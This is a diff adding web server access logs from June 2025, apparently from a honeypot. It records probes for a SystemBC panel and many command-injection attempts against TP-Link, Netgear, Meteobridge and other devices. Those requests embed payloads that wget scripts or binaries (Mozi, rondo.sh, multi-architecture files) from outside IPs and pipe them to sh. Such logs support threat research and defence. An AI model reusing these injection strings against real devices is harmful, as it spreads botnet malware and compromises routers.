@@ -1,0 +1,53 @@
+159.65.159.214 - - [14/Jun/2025 04:14:02] "GET /systembc/password.php HTTP/1.1" 200 -
+144.126.236.85 - - [14/Jun/2025 16:49:36] "GET /systembc/password.php HTTP/1.1" 200 -
+165.22.189.140 - - [14/Jun/2025 17:14:29] "GET /systembc/password.php HTTP/1.1" 200 -
+128.199.23.56 - - [15/Jun/2025 05:10:00] "GET /systembc/password.php HTTP/1.1" 200 -
+157.230.223.141 - - [15/Jun/2025 17:37:17] "GET /systembc/password.php HTTP/1.1" 200 -
+167.99.250.174 - - [16/Jun/2025 05:35:35] "GET /systembc/password.php HTTP/1.1" 200 -
+206.189.11.171 - - [03/Jun/2025 23:57:59] "GET /systembc/password.php HTTP/1.1" 200 -
+209.38.90.32 - - [04/Jun/2025 13:07:31] "GET /systembc/password.php HTTP/1.1" 200 -
+209.38.99.66 - - [05/Jun/2025 02:08:59] "GET /systembc/password.php HTTP/1.1" 200 -
+45.58.159.209 - - [05/Jun/2025 14:39:22] "GET /systembc/password.php HTTP/1.1" 200 -
+45.58.159.74 - - [05/Jun/2025 20:42:22] "GET /systembc/password.php HTTP/1.1" 200 -
+45.58.159.74 - - [06/Jun/2025 08:19:22] "GET /systembc/password.php HTTP/1.1" 200 -
+178.62.227.201 - - [06/Jun/2025 14:19:44] "GET /systembc/password.php HTTP/1.1" 200 -
+45.58.159.164 - - [07/Jun/2025 02:32:46] "GET /systembc/password.php HTTP/1.1" 200 -
+45.58.159.209 - - [07/Jun/2025 08:00:42] "GET /systembc/password.php HTTP/1.1" 200 -
+204.188.197.116 - - [07/Jun/2025 14:27:39] "GET /systembc/password.php HTTP/1.1" 200 -
+134.122.80.36 - - [07/Jun/2025 20:25:04] "GET /systembc/password.php HTTP/1.1" 200 -
+204.188.197.65 - - [08/Jun/2025 20:07:53] "GET /systembc/password.php HTTP/1.1" 200 -
+167.99.114.204 - - [09/Jun/2025 01:54:25] "GET /systembc/password.php HTTP/1.1" 200 -
+68.183.197.169 - - [09/Jun/2025 11:10:37] "GET /systembc/password.php HTTP/1.1" 200 -
+204.188.197.93 - - [09/Jun/2025 13:47:08] "GET /systembc/password.php HTTP/1.1" 200 -
+170.64.167.44 - - [09/Jun/2025 20:50:22] "GET /systembc/password.php HTTP/1.1" 200 -
+
+87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+222.141.154.166 - - [15/Jun/2025 07:11:58] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+222.141.154.166 - - [15/Jun/2025 07:11:58] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+45.135.194.34 - - [15/Jun/2025 14:15:30] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [15/Jun/2025 15:32:36] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [15/Jun/2025 22:41:26] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F154.91.254.95%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [16/Jun/2025 01:44:16] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [16/Jun/2025 04:30:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+45.135.194.34 - - [16/Jun/2025 07:32:49] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B) HTTP/1.1" 200 -
+87.121.84.34 - - [16/Jun/2025 09:01:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [16/Jun/2025 09:01:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+45.135.194.34 - - [03/Jun/2025 23:32:48] "GET /public/template.cgi?templatefile=$(cd%20%2Ftmp%3Brm%20-rf%20rondo.sh%3Bwget%20http%3A%2F%2F78.153.149.90%2Frondo.sh%3Bsudo%20sh%20rondo.sh%20meteobridge%7C%7Csh%20rondo.sh%20meteobridge%3Becho%20) HTTP/1.1" 200 -
+120.28.168.233 - - [05/Jun/2025 11:43:34] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.28.168.233:55841/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 200 -
+87.121.84.34 - - [08/Jun/2025 16:25:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [08/Jun/2025 16:25:53] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 07:21:35] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 07:21:36] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 08:39:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 08:39:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://45.125.66.79/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 15:30:46] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [09/Jun/2025 15:30:47] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+141.98.11.147 - - [09/Jun/2025 20:49:44] "GET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/x86;chmod+777+*;./x86+x86;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm7;chmod+777+*;./arm7+arm7;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm4;chmod+777+*;./arm4+arm4;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm5;chmod+777+*;./arm5+arm5 HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 21:18:20] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+87.121.84.34 - - [09/Jun/2025 21:18:21] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+141.98.11.147 - - [10/Jun/2025 00:22:21] "GET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/x86;chmod+777+*;./x86+x86;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm7;chmod+777+*;./arm7+arm7;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm4;chmod+777+*;./arm4+arm4;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm5;chmod+777+*;./arm5+arm5 HTTP/1.1" 200 -
+195.3.221.137 - - [10/Jun/2025 04:05:10] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+195.3.221.137 - - [10/Jun/2025 04:05:10] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
+141.98.11.147 - - [10/Jun/2025 04:53:28] "GET /shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/x86;chmod+777+*;./x86+x86;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm7;chmod+777+*;./arm7+arm7;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm4;chmod+777+*;./arm4+arm4;cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/94.26.90.251/arm5;chmod+777+*;./arm5+arm5 HTTP/1.1" 200 -
+
